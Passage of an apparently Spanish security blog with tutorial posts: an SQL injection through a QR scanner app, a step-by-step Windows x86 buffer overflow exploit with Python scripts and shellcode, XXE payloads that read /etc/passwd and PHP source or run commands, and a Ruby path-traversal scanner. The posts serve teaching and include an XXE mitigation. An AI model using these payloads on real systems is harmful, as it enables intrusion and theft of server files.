<br /><br />El pequeño arsenal del defacer. <br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/7Ri8TTI.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/7Ri8TTI.png" height="290" width="640" /></a></div><div style="text-align: center;"><br /></div><br />Ojala les haya gustado esta Hacknecdota.<br /><br /><div style="text-align: right;">Saludos! </div></div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/01/16/sqli-en-qr-scanner/">SQLi en QR Scanner</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-01-16T09:27:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>16</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:27 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://blog.netizen-online.es/wp-content/uploads/2013/10/codigo-qr.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://blog.netizen-online.es/wp-content/uploads/2013/10/codigo-qr.jpg" height="320" width="320" /></a></div><div style="text-align: right;"><b>by hdbreaker</b></div><br />Hoy les traigo algo no muy difícil pero que me resulto curioso: un SQLI por medio de un lector QR o un Lector externo láser de barcodes<br /><br />Me&nbspparece&nbspinteresante&nbspcompartir, ya que es algo que pocos se imaginan, un SQLI en una aplicación totalmente Nativa Android con motor SQLite (SQLI no es solo para Webs)<br /><br />Dejo algunas Capturas:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i39.tinypic.com/wu026h.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i39.tinypic.com/wu026h.jpg" height="640" width="480" /></a></div><span id="goog_589221668"></span><span id="goog_589221669"></span><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i44.tinypic.com/2uszx34.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i44.tinypic.com/2uszx34.png" height="640" width="360" /></a></div><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i40.tinypic.com/5drqqc.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i40.tinypic.com/5drqqc.png" height="640" width="360" /></a></div><br />ZonalCUYO es el Usuario y el codigo Hexa (0x) es el ValidatorID con el cual la app accede a los WebServices<br /><div style="text-align: right;"><br /><b>Saludos!</b></div></div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/01/16/desbordando-el-buffer-win-x86/">Desbordando El Buffer Win X86</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-01-16T09:00:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>16</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:00 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><br /><div style="text-align: center;"><div class="separator" style="clear: both; text-align: center;"><a href="http://img.zlotracker.org/poster/19291.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://img.zlotracker.org/poster/19291.jpg" height="300" width="320" /></a></div><div style="text-align: right;"><b>by hdbreaker</b></div></div><span class="Ttulo3Car"><span style="font-size: 13.0pt; mso-fareast-font-family: &quot;Arial Unicode MS&quot;;">Codigo del Programa a Analizar: </span></span><br /><pre class="brush: cpp">#include &lt;cstdlib&gt;<br />#include &lt;iostream&gt;<br /><br />using namespace std;<br /><br />int main(int argc, char *argv[])<br />{<br /><br />char Nombre[20];<br />FILE *archivo;<br />char letras[1000];<br /><br />archivo = fopen("config.txt", "r");<br />fgets(letras, 1000, archivo);<br />strcpy(Nombre, letras);<br /><br />printf("%s\n", Nombre);<br /><br />system("PAUSE");<br /><br />fclose;<br />return EXIT_SUCCESS;<br /><br />}<br /></pre><div><div class="MsoNormal"><br /></div><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i45.tinypic.com/2nrklug.png" height="358" onclick="zoomToggle('640px','360px','100%','100%',this);" width="640" /></div><br /><div class="MsoNormal">Este breve programa en C procede a leer de un archivo de configuración "config.txt" cierta cantidad de letras con el comando fgets, esta instruccion no controla el largo de los datos que recibirá. <br /><br />La lógica nos dice que si este comando esta preparado para recibir 1000 letras y nostros le enviamos 1001 letras esto podría resultar en un Buffer Overflow y el tipico cartel de corrupción de memoria.<br /><br />Entendido el Concepto estamos listos para probar si esto es cierto.<br /><br />Utilizando algun lenguaje de programacion (en mi caso python) empezaremos a preparar el exploit.<br /><br /><pre class="brush: py">Variable = 'A'<br />for a in range (999):<br />   Variable = Variable + 'A'<br />Archivo = open("config.txt","r+")<br />Archivo.write('%s' %(Variable))<br />Archivo.close()<br /></pre><br />Con este simple codigo probaremos el concepto, esto creara un archivo config.txt que contendrá 1000 letras A concatenadas.<br /><br />Sustituimos el archivo de configuración del programa por el nuestro y vemos como rompe.</div><div class="MsoNormal"><br /></div><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i48.tinypic.com/xkt7ab.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><br /><div class="MsoNormal">Al no tener un control de Excepciones, mejor conocido como Exeption Handling no salta el clásico mensaje informando que el programa se cerro inesperadamente.<br /><br />Analicemos con Ollydbg:<br /><br /><div style="text-align: center;"><img border="0" src="http://i50.tinypic.com/25a2otk.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div></div><div class="MsoNormal"><br /></div><div class="MsoNormal">Vemos el cartel que nos muestra como el EIP ha sido sobre escrito con el hexadecimal 41414141 (AAAA). Hemos Encontrado nuestro BOF y es momento de Explotarlo. <br />Lo primero que necesitamos es encontrar la dirección exacta donde se realiza la sobre escritura, para eso utilizariamos metasploit<br /><br />Vamos a nuestra ruta de metasploit y entramos en la carpeta tools<br /><br />ejecutamos <br /><br /><pre class="brush: bash">sudo ./pattern_create.rb 1000<br /></pre><br />y vemos un string de 1000 caracteres irrepetibles, esto nos servirá a encontrar el largo exacto de la cadena al momento de la sobre escritura</div><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i50.tinypic.com/259x1es.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><div class="separator" style="clear: both; text-align: center;"><br /></div><div class="MsoNormal">Sustituimos nuestra la variable de nuestro script en python por el string generado con metasploit<br /><br />queda de esta manera:<br /><br /><pre class="brush: py">Variable = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B'<br />#for a in range (999):<br />    #Variable = Variable + 'A'<br />Variable = Variable<br />Archivo = open("config.txt","r+")<br />Archivo.write('%s' %(Variable))<br />Archivo.close()<br /></pre><br />Ejecutamos este script en python y sustituimos nuevamente el archivo de configuracion. (config.txt)<br /><br />Ejecutamos nuevamente con ollydbg y vemos el string exacto en hexadecimal con el que se sustituyo el EIP</div><div class="MsoNormal"><br /></div><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i47.tinypic.com/flc8q8.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><div class="MsoNormal">Anotamos este numero: <br /><span style="color: red;">66413965</span><br /><br />vamos de nuevo a nuestra ruta de metasploit y ejecutamos:<br /><br /><pre class="brush: bash">sudo ./pattern_offset.rb 66413965<br /></pre>Vemos el resultado 148, esto es la dirección exacta de donde comienza el EIP<br /><br /></div><div class="MsoNormal">Exact match at offset 148</div><div class="MsoNormal"><br /></div><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i45.tinypic.com/e0hdm0.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><div><br /></div><div class="MsoNormal">Vamos a modificar nuevamente nuestro script en python:<br /><br /><pre class="brush: py">Variable = 'A'<br />for a in range (147): #Cuenta desde 0 por lo que queda en 148<br />    Variable = Variable + 'A'<br />Archivo = open("config.txt","r+")<br />Archivo.write('%s' %(Variable))<br />Archivo.close()<br /><br /></pre>Sustituimos nuevamente el archivo de configuración por el nuevo generado por el exploit<br /><br />Ejecutamos y vemos el siguiente resultado:</div><div><br /></div><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i45.tinypic.com/34xknix.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><div><br /></div><div class="MsoNormal">Se preguntaran porque se sucede el error el Olly, si estamos escribiendo 148 caracteres y esto nos posiciona justo en el momento de la sobre escritura?<br /><br />Esto sucede por que los 148 bytes es la distancia de la cadena + los 4 bytes que pisan el EPI, por lo que 148-4 = 144 <br /><br />Esto nos posicionara al comienzo del EIP dejandolo intacto:<br /><br />Modificamos el Script y lo dejamos asi:<br /><br /><pre class="brush: py">Variable = 'A'<br />for a in range (143): #Cuenta desde 0 por lo que queda en 144<br />    Variable = Variable + 'A'<br />Archivo = open("config.txt","r+")<br />Archivo.write('%s' %(Variable))<br />Archivo.close()<br /></pre><br />Sustituimos el archivo y ejecutamos nuevamente el programa.</div><div class="MsoNormal"><br /></div><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i48.tinypic.com/24xgf3p.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><div><br /></div><div class="MsoNormal">Como vemos el programa no rompe lo q significa que no hemos sobre escrito el EIP y con suerte estamos posicionados al pie de nuestro EIP, Probemos esto.<br /><br />Modificamos Nuestro Script y lo dejamos asi:<br /><br /><pre class="brush: py">Variable = 'A'<br />EIP = 'BBBB'<br />for a in range (143): #Cuenta desde 0 por lo que queda en 144<br />    Variable = Variable + 'A'<br />Variable = Variable + EIP #Sustituimos los 4 bytes faltantes por una Cadena Identificable que sustituya el EIP   <br />Archivo = open("config.txt","r+")<br />Archivo.write('%s' %(Variable))<br />Archivo.close()<br /></pre><br />Copiamos el archivo generado por nuestro exploit y ejecutamos nuevamente el programa<br /><br />Con esto estaremos en el pie del EIP o Relativamente cerca con variaciones de +- 4 bytes, Este no es el caso y vemos que el software sigue rompe por lo q aplicaremos algo que se conoce como acorralar offset<br /><br />sabemos que la sobre escritura de nuestro EIP se produce dentro de los 148 bytes, por lo que dividiremos esto en 2 cadenas de Bytes una con 'A' y la otra con 'B'.<br /><br />74 bytes 'A' y 74 bytes 'B'<br /><br />Nuestro script Quedara:<br /><br /><pre class="brush: py">VariableA = 'A'<br />VariableB = 'B'<br />Variable = ''<br />for a in range (74):<br />    Variable = Variable + 'A'<br /><br />for b in range (74):<br />    Variable = Variable + 'B'<br />#Variable = Variable + EIP #Sustituimos los 4 bytes faltantes por una Cadena Identificable que sustituya el EIP   <br />Archivo = open("config.txt","r+")<br />Archivo.write('%s' %(Variable))<br />Archivo.close()<br /></pre><br />copiamos el archivo de configuración y ejecutamos:</div><div class="MsoNormal"><br /></div><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i49.tinypic.com/25k1x7r.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><div><br /></div><div class="MsoNormal">Como vemos la sobreescritura es de 41414141 o lo q es lo mismo AAAA<br /><br />deducimos que la sobre escritura se produce en los primeros 74 bytes.<br /><br />realizamos nuevamente el procedimiento de pattern_create y pattern_offset de metasploit<br />creando una cadena al asar e irrepetible de 74 bytes, al ejecutar el programa nuevamente vemos que hemos logrado pisar el EIP con: 35624134<br /><br />Pasamos<span style="color: lime;"><span style="color: black;">:</span> <span style="color: red;">pattern_offset 0x35624134 74</span></span><br /><br />y nos da como resultado 44 bytes, Posiblemente aquí sea donde se sobrescribe el EIP.<br /><br />Modificamos el Script:<br /><br /><pre class="brush: py">VariableA = 'A'<br />EIP = 'BBBB'<br />Variable = ''<br />for a in range (44):<br />    Variable = Variable + 'A'<br />Variable = Variable + EIP #Sustituimos los 4 bytes faltantes por una Cadena Identificable que sustituya el EIP   <br />Archivo = open("config.txt","r+")<br />Archivo.write('%s' %(Variable))<br />Archivo.close()<br /></pre><br /></div><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i49.tinypic.com/10qw96e.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><div><br /></div><div><br /></div><div class="MsoNormal">Como podemos ver EIP ha sido sustituido con 42424242 por lo que hemos logrado encontrar la posición exacta del EIP<br /><br />procederemos a realizar nuestro exploit con nuestro shellCode:<br /><br />La estructura de nuestro script sera:<br /><br /><span style="color: red;">44 Bytes: A (NOPS)</span><br /><span style="color: red;">4 bytes: B (EPI)</span><br /><span style="color: red;">100 bytes: C (ShellCode)</span><br /><br />El Script queda de esta manera:<br /><br /><pre class="brush: py">VariableA = 'A'<br />EIP = 'BBBB'<br />Variable = ''<br />ShellCode = ''<br />for a in range (44): #Cuenta desde 0 por lo que queda en 144<br />    Variable = Variable + 'A'<br />Variable = Variable + EIP #Sustituimos los 4 bytes faltantes por una Cadena Identificable que sustituya el EIP   <br />for b in range (100):<br />    ShellCode = ShellCode + 'C'<br /><br />Variable = Variable+ShellCode<br /><br />Archivo = open("config.txt","r+")<br />Archivo.write('%s' %(Variable))<br />Archivo.close()<br /></pre><br />Copiamos el archivo de configuración generado a la ruta del software vulnerable y ejecutamos con Ollydbg.</div><div class="MsoNormal"><br /></div><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i49.tinypic.com/264mfs8.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><div><br /></div><div class="MsoNormal">Como podemos ver en los Registros, tenemos:<br /><br />.EIP&nbsp; con 42424242 (BBBB)<br />.ESP con 100 bytes de 'C'<br /><br />Esto nos indica que debemos realizar un salto con EIP hacia ESP donde nuestra shellCode Tiene un espacio de 100 bytes (espacio que pude variar dependiendo cuanto indagemos) para ser alojada.<br /><br />Consigamos un Salto a ESP:<br /><br />Abrimos Con Nuestro OllyDbg el software vulnerable, cliqueamos en la letra E en la barra Superior de Olly (Executable Modules)<br /><br />Seleccionamos alguna DLL en la lista y vamos damos click derecho seach for --&gt; Command<br />y buscamos algo q haga referencia a ESP:<br /><br /><span style="color: red;">JMP ESP</span><br /><span style="color: red;">CALL ESP</span><br /><br />o alguna variacion matematica que nos pocicione en ESP<br /><span style="color: red;"><br /></span><span style="color: red;">POP POP RET</span><br /><span style="color: red;">PUSH PUSH POP, etc.</span><br /><br />Una ves que llegamos a esto en mi caso un CALL ESP anotamos la dirección y volvemos al script</div><div class="MsoNormal"><br /></div><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i47.tinypic.com/wvrfys.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><div><br /></div><div class="MsoNormal">Modificamos nuestro script de la siguiente forma: <span style="color: lime;"></span><br /><pre class="brush: py">import struct #Importamos libreria Struct<br /><br />VariableA = 'A'<br /><br />EIP = struct.pack('&lt;I', 0x7C8369D8) #Creamos el salto y lo colocamos<br />en la Variable que sustituira EIP<br /><br />Variable = ''<br />ShellCode = '' #Creamos Variable que contendra la ShellCode<br /><br />for a in range (44):<br />  Variable = Variable + 'A'<br />  Variable = Variable + EIP #Sustituimos los 4 bytes faltantes por una<br />  Cadena Identificable que sustituya el EIP<br /><br />for b in range (100):<br />  ShellCode = ShellCode + 'C' #Llenamos de C los 100 bytes de la ShellCode.<br /><br />Variable = Variable+ShellCode<br />Archivo = open("config.txt","r+")<br />Archivo.write('%s' %(Variable))<br /><br />Archivo.close()<br /><br /></pre></div>copiamos nuestro exploit config.txt al directorio del software vulnerable y ejecutamos con ollydbg, si todo sale bien</div><div class="MsoNormal"><br />no debería salir ningún cartel de dirección invalida de EIP ya que este realizara un salto al pie de ESP (donde se aloja nuestro ShellCode)</div><div><br /></div><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i50.tinypic.com/1ifj0j.png" height="356" onclick="zoomToggle('640px','356px','100%','100%',this);" width="640" /></div><div><br /></div><div class="MsoNormal">Como podemos ver no se produjo ningón error y vemos en el stack que estamos justo una linea antes de nuestras 'C'<br /><br /><span style="color: red;">(43x100bytes)</span><br /><br />Estamos listos para agregar nuestro Shellcode</div><div class="MsoNormal"><br /><span style="color: red;">"\xeB\x02\xBA\xC7\x93\xBF\x77\xFF\xD2\xCC\xE8\xF3\xFF\xFF\xFF\x63\x61\x6C\x63"</span></div><br />Lo colocamos en nuestro Script (En este caso usare una pequeña shellCode que ejecuta una calc en 19 bytes):<br /><br /><pre class="brush: py">import struct #Importamos libreria Struct<br /><br />VariableA = 'A'<br /><br />EIP = struct.pack('&lt;I', 0x7C8369D8) #Creamos el salto y lo colocamos<br />en la Variable que sustituira EIP<br /><br />Variable = ''<br /><br />ShellCode = "\xeB\x02\xBA\xC7\x93\xBF\x77\xFF\xD2\xCC\xE8\xF3\xFF\xFF\xFF\x63\x61\<br />x6C\x63" #Creamos Variable que contendra la ShellCode<br /><br />for a in range (44):<br />  Variable = Variable + 'A'<br />  Variable = Variable + EIP #Sustituimos los 4 bytes faltantes por una<br />  Cadena Identificable que sustituya el EIP<br /><br />Variable = Variable+ShellCode<br /><br />Archivo = open("config.txt","r+")<br />Archivo.write('%s' %(Variable))<br />Archivo.close()<br /><br /></pre><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://i45.tinypic.com/nwx5z6.png" height="358" onclick="zoomToggle('640px','358px','100%','100%',this);" width="640" /></div><div class="MsoNormal"><br />y en este momento hemos logrado ejecutar nuestro shellCode con exito.<br /><br /><div style="text-align: right;"><b>Saludos!</b></div></div></div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/01/15/xxe-injection-i/">XXE Injection (I)</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-01-15T14:51:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>15</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:51 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-G5S8Y4aMu0k/VLhCPOx36SI/AAAAAAAAAPw/b8HoZeRtp5w/s1600/xml.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-G5S8Y4aMu0k/VLhCPOx36SI/AAAAAAAAAPw/b8HoZeRtp5w/s1600/xml.jpg" height="200" width="400" /></a></div><br /><br />Las inyecciones <b>XXE</b> son una técnica de explotación que se centra en aprovechar el uso de&nbsp; entidades externas dentro de un documento XML (<span class="st">eXtensible Markup Language</span>). <br /><br />Para lograr comprender el&nbspsignificado&nbspde&nbspentidad&nbspy&nbspasi adentrarnos en este tutorial, se recomienda tener un conocimiento basico sobre la estructura del lenguaje, pueden pasarse por el siguiente <a href="http://www.mclibre.org/consultar/xml/">enlace</a> donde encontraran mucho material acerca de la sintaxis de XML.<br /><br /><br />Primero se van a tener en cuenta un par de conceptos que tocaremos dentro de este apartado.<br /><br /><ul><li><b>Que es un DTD?</b></li></ul><br />Un DTD y como sus siglas lo indican (Definicion del tipo de documento), se encarga de decirle a el <b>parser XML</b> (motor XML) como va a estar compuesto un fichero de este tipo.<br /><br />Cada vez que un xml es cargado, el que se ocupa de verificar si dicho fichero presenta una estructura correcta, entre otras cosas, es el parser XML y lo hace primero consultando el DTD.<br /><br />Los DTD pueden encontrarse dentro del documento.<br /><br /><script class="brush: xml" type="syntaxhighlighter"><![CDATA[ <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE secsignal [  ]>]]></script> <br />Todo lo que se encuentra dentro del tag <b>[]</b> es parte del DTD.<br /><br /><br />O externos al mismo.<br /><br /><script class="brush: xml" type="syntaxhighlighter"><![CDATA[ <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE secsignal SYSTEM "fichero.dtd" [  ]>]]></script> <br />Dentro de un DTD podemos realizar varias declaraciones, durante este escrito solo nos ocuparemos de la creacion de entidades.<br /><br /><br /><ul><li><b>Declaracion de entidades</b></li></ul><br />Para continuar con la explicacion, programe un simple script en php que se va a encargar de procesar strings XML.<br /><br /><script class="brush: php" type="syntaxhighlighter"><![CDATA[ <?php  if(!empty($_GET['xml'])){      $xml=$_GET['xml'];      $out=simplexml_load_string($xml);      echo $out->salida;  }  ?>  ]]></script> <br />Una entidad es algo muy similar a una constante, se encarga de almacenar valores que no pueden ser modificados a diferencia de una variable. Se pueden definir dos tipos de entidades:<br /><br /><ul><li>Internas</li></ul><br /><script class="brush: xml" type="syntaxhighlighter"><![CDATA[ <!ENTITY foo "Yo soy el valor de la entidad interna">]]></script> <br /><ul><li>Externas</li></ul><br /><script class="brush: xml" type="syntaxhighlighter"><![CDATA[ <!ENTITY foo SYSTEM "fichero.txt">]]></script> Para ambas entidades, al momento de llamarlas, tenemos lo que son las <b>Entidades generales</b> que pueden usarse dentro del documento xml y las <b>Entidades parametro</b>, que solo pueden llamarse dentro del <b>DTD</b>.<br /><br />El analisis de esta ultima va a dejarse para mas adelante ya que por el momento no se requiere su uso.<br /><br />Tenemos el siguiente documento, en el que hacemos referencia a una <b>entidad interna</b><br /><br /><script class="brush: xml" type="syntaxhighlighter"><![CDATA[ <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE secsignal [ <!ENTITY foo "Yo soy el valor de la entidad interna">]> <secsignal>    <salida>&foo;</salida></secsignal>]]></script> Fijense la sintaxis de acceso a la entidad interna general (<b>&amp;foo;</b>). Esto imprimiria <b>"Yo soy el valor de la entidad interna" </b>dentro del elemento <b>&lt;salida&gt;</b><br /><b><br /></b>Urlencodeamos y enviamos.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-4GYEjalhz1E/VLg_MG9PZRI/AAAAAAAAAPU/51UNfGdSN48/s1600/1.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-4GYEjalhz1E/VLg_MG9PZRI/AAAAAAAAAPU/51UNfGdSN48/s640/1.png" /></a></div><br /><br />Pero que pasa cuando hacemos uso de entidades externas? ahi esta el verdadero peligro ya que nos permiten <b>leer ficheros dentro del servidor, realizar ataques DOS, enumerar servicios internos en la red y hasta incluso ejecutar comandos en el sistema</b>.<br /><br /><b>SYSTEM</b> nos deja utilizar ciertos wrappers y protocolos como <b>file://, php://, http://, ftp://, expect://</b>, entre otros.<br /><br />Intentemos divisar el famoso archivo <b>/etc/passwd</b><br /><br /><script class="brush: xml" type="syntaxhighlighter"><![CDATA[ <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE secsignal [ <!ENTITY foo SYSTEM "file:///etc/passwd">]> <secsignal>    <salida>&foo;</salida></secsignal>]]></script> <br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-RPZ5cuTzT1U/VLg_hl4bLqI/AAAAAAAAAPc/4GzR7tyMqFU/s1600/2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-RPZ5cuTzT1U/VLg_hl4bLqI/AAAAAAAAAPc/4GzR7tyMqFU/s640/2.png" /></a></div><br /><b>Leer ficheros php</b><br /><br /><script class="brush: xml" type="syntaxhighlighter"><![CDATA[ <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE secsignal [  <!ENTITY foo SYSTEM "php://filter/convert.base64-encode/resource=/var/www/xxe/load.php">]> <secsignal>    <salida>&foo;</salida></secsignal>]]></script> <br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-o2E5jt0LcsA/VLg_sKi6KiI/AAAAAAAAAPk/weSK-P65Ttc/s1600/3.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-o2E5jt0LcsA/VLg_sKi6KiI/AAAAAAAAAPk/weSK-P65Ttc/s640/3.png" /></a></div><br /><b>Ejecutar comandos</b> siempre y cuando este instalado <b>expect://</b> en php, lo cual lo veo como una opcion poco probabable de darse, pero es interesante saber que podria estar presente en algun que otro entorno.<br /><br /><br /><script class="brush: xml" type="syntaxhighlighter"><![CDATA[ <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE secsignal [  <!ENTITY foo SYSTEM "expect://uname">]> <secsignal>    <salida>&foo;</salida></secsignal>]]></script> <br />Este tipo de falensias puede aprovecharse en webs que pidan la subida, por ejemplo de CVS en formato XML e impriman su contenido.<br />Incluso hasta el propio <b>FB</b> recientemente sufrio el impacto de esta tecnica, a diferencia de que los datos no eran procesados a la vista, lo cual deja como incognita la explotacion de <b>XXE a ciegas</b> para el proximo post.<br /><br />Me olvidaba, para evitar el uso de entidades externas cuando procesemos nuestros ficheros solo basta con utilizar la funcion<b> libxml_disable_entity_loader()</b> del siguiente modo.<br /><br /><script class="brush: php" type="syntaxhighlighter"><![CDATA[ <?php libxml_disable_entity_loader(true);  if(!empty($_GET['xml'])){     $xml=$_GET['xml'];     $out=simplexml_load_string($xml);     echo $out->salida;  } ?>]]></script> Saludos!</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/01/14/escribiendo-un-auxiliar-para-msf/">Escribiendo Un Auxiliar Para MSF</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-01-14T13:13:00-08:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>14</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:13 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/boJZ1iI.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/boJZ1iI.jpg" height="265" width="400" />&nbsp;</a></div><div class="separator" style="clear: both; text-align: right;"><b>By [Q]3rV[0]</b></div><div class="separator" style="clear: both; text-align: right;"><br /></div>La idea de comenzar a aprender ruby llego solo por el echo de poder  ver en la consola del msf un auxiliar escrito por mi. <br /><br />La Interfaz&nbspde&nbspProgramación&nbspde&nbspAplicaciones<span class="st"> (API)</span> de  metasploit no es muy complicadad de llevar y con solo unos dias de  practica, y es mas, ya estando familiarizados con otros lenguajes  similares como lo son python y perl la forma de tomar el control de ruby  se hace mas llevadera que comenzar desde cero. Por suspuesto no estoy  diciendo que sean realmente identicos pero ambos lenguajes poseen  ciertas caracteristicas como la sencilles de su sintaxis, entre otras.<br /><br />Durante este tutorial se mostrara paso a paso como aderir nuestra  herramienta escrita en ruby como modulo auxiliar de msf. Para ello  programe un sencillo scanner de LFI.<br /><script class="brush: ruby" type="syntaxhighlighter"><![CDATA[ #!/usr/bin/ruby  # Autor: [Q]3rV[0]  require 'net/http' require 'uri'  def conn(vector)    host=URI.parse(vector)    return Net::HTTP.get(host)  end  def compr(data, vector)          if data =~ /root:/             puts "Parametro vulnerable a LFI -> #{vector}\n"         else             puts "Not Found -> #{vector}\n"      end end  def lfi(web, pb, file)      a=0      while a<pb         a=a+1          traversal="../"*a+file         vector=web+traversal          data=conn(vector)          compr(data, vector)  end end  lfi(ARGV[0], ARGV[1].to_i, "etc/passwd") lfi(ARGV[0], ARGV[1].to_i, "etc/passwd")   ]]></script>Se le debera pasar como argumentos el parametro vulnerable y un numero que indicara la cantidad de ‘../’ que realizara la inyeccion.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/w3ALLIF.png" 